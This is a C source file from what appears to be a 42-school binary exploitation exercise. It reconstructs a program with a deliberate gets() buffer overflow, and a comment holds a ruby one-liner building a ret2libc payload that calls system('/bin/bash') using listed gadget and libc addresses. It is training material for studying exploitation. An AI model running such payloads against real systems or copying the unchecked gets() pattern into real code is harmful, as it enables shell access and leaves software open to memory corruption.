/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   level2.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/04/09 18:21:16 by fcadet            #+#    #+#             */
/*   Updated: 2021/04/12 13:47:49 by fcadet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

//ruby -e 'print "/bin/bash" + "\x00" * (80 - 9) + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "OEIP" + "\x08\xa0\x04\x08"' > /tmp/exploit
//0x0804853e	p ret
//0xb7e6b060	system
//0x0804a008	strdup result (heap)

char	*p(void) {

	void	*ptr;
	char	str[64];

	fflush(stdout);
	gets(str);

	ptr = &str[80];

	if (((unsigned int)ptr & 0xb0000000) == 0xb0000000) {
		printf("(%p)\n", ptr);
		exit(1);
	}

	puts(str);
	return (strdup(str));
}

int		main(void) {
	return ((int)p());
}
